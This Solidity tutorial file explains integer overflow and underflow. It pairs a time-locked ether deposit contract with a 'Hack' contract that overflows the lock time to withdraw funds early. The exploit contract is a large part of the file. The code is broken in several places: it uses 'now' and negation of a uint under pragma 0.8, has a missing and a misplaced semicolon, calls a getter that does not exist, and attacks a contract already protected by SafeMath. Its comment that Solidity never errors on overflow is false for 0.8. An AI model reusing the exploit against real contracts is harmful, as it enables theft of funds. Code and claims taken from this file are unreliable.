//SPDX-License-Identifier: MIT
// overflow - when a number is bigger than the counting range it starts back from initial point

// uint = uint256

// 0 <= x <= 2**256 -1

// case 1 : Overflow

// what happens when x is greater than 2**256-1

// e.g. x = (2**256-1) + 5
// solidity will take it as x = 4 starting from 0,1,2,3,(4) <- 5th index
// when a number overflows solidity does not give any error or warning

// underflow - when a number is smaller than the counting range it starts back from the final point

// case 1 : Underflow
// what happens when x is less than 0

// eg. x = -2
// solidity willl take it as x = (2**256-1) - 2

// in both the above cases you ended with a differnt number you started with

/**Preventive Techniques */
//1. use SafeMath by OpenZeppelin 
//2. Update variable functions with methods of openzeppelin safemath

pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract DepositEtherForAWeek {
    using SafeMath for uint;

    mapping(address => uint256) balances;
    mapping(address => uint256) lockTime;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] += now + 1 weeks;
    }

    function increaseLockTime(uint256 _increaseLockTimeInSeconds) public {
        // lockTime[msg.sender] += _increaseLockTimeInSeconds; // overflow if _increaseLockTimeInSeconds > 2**256-1
        lockTime[msg.sender] = lockTime[msg.sender].add(
            _increaseLockTimeInSeconds
        ); // add safemath checks for overflow
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient Balance!");
        require(now > lockTime[msg.sender], "Lock time has not expired!");
        uint256 amount = balances[msg.sender];

        balances[msg.sender] = 0;
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send ether!")
    }
}

contract Hack {
    DepositEtherForAWeek etherForAweek;

    constructor(address _etherForAweekAddress) {
        etherForAweek = DepositEtherForAWeek(_etherForAweekAddress);
    }

    fallback() external payable {

    }

    function attack() public payable {
        etherForAweek.deposit{value :msg.value}();
        // t = current lock time
        // put x such that
        // x + t = 2**256 =0
        // x = -t

        etherForAweek.increaseLockTime(
            uint(-etherForAweek.lockTime(address(this)));
        )
        etherForAweek.withdraw();
    }
}
